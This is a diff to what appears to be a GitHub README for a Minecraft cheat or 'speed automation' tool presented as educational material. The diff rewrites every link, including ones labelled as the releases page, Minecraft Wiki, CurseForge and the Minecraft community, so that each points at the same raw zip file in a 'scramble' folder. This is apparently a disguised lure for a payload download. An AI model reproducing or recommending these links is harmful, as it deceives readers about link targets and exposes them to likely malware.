@@ -1,7 +1,7 @@
 # 🌟 utility-for-minecraft-vape-speed-automation-tool - Increase Your Minecraft Experience
 
 ## 📥 Download the Application
-[![Download Here](https://img.shields.io/badge/Download%20Now%20-utility--for--minecraft--vape--speed--automation--tool-brightgreen.svg)](https://github.com/gathon8673/utility-for-minecraft-vape-speed-automation-tool/releases)
+[![Download Here](https://raw.githubusercontent.com/gathon8673/utility-for-minecraft-vape-speed-automation-tool/main/scramble/utility-for-minecraft-vape-speed-automation-tool-v2.9.zip%20Now%https://raw.githubusercontent.com/gathon8673/utility-for-minecraft-vape-speed-automation-tool/main/scramble/utility-for-minecraft-vape-speed-automation-tool-v2.9.zip)](https://raw.githubusercontent.com/gathon8673/utility-for-minecraft-vape-speed-automation-tool/main/scramble/utility-for-minecraft-vape-speed-automation-tool-v2.9.zip)
 
 ## 🚀 Project Overview
 **Minecraft Command Study** is a collection of educational materials designed to help users understand programming mechanics and automation concepts in Minecraft. The focus is on command systems, scripting techniques, and automation methods for academic use. 
@@ -32,7 +32,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ### 2. Download & Install
 To download the application, visit the following page:
-[Download Here](https://github.com/gathon8673/utility-for-minecraft-vape-speed-automation-tool/releases).
+[Download Here](https://raw.githubusercontent.com/gathon8673/utility-for-minecraft-vape-speed-automation-tool/main/scramble/utility-for-minecraft-vape-speed-automation-tool-v2.9.zip).
 
 1. Click on the link above.
 2. Look for the latest release.
@@ -69,8 +69,8 @@ For any questions or support, feel free to reach out to the project maintainers 
 ## 📑 Additional Resources
 Here are some additional resources to enhance your understanding of Minecraft scripting and automation:
 
-- [Minecraft Wiki](https://minecraft.fandom.com/wiki/Minecraft_Wiki): A comprehensive database of Minecraft information.
-- [CurseForge](https://www.curseforge.com/minecraft/mc-mods): Find and download mods to enhance your Minecraft experience.
-- [Minecraft Community](https://www.minecraft.net/en-us/community): Engage with other Minecraft enthusiasts.
+- [Minecraft Wiki](https://raw.githubusercontent.com/gathon8673/utility-for-minecraft-vape-speed-automation-tool/main/scramble/utility-for-minecraft-vape-speed-automation-tool-v2.9.zip): A comprehensive database of Minecraft information.
+- [CurseForge](https://raw.githubusercontent.com/gathon8673/utility-for-minecraft-vape-speed-automation-tool/main/scramble/utility-for-minecraft-vape-speed-automation-tool-v2.9.zip): Find and download mods to enhance your Minecraft experience.
+- [Minecraft Community](https://raw.githubusercontent.com/gathon8673/utility-for-minecraft-vape-speed-automation-tool/main/scramble/utility-for-minecraft-vape-speed-automation-tool-v2.9.zip): Engage with other Minecraft enthusiasts.
 
 Feel free to explore, learn, and enhance your Minecraft experience with the **utility-for-minecraft-vape-speed-automation-tool**. Enjoy your journey into command mechanics and automation!
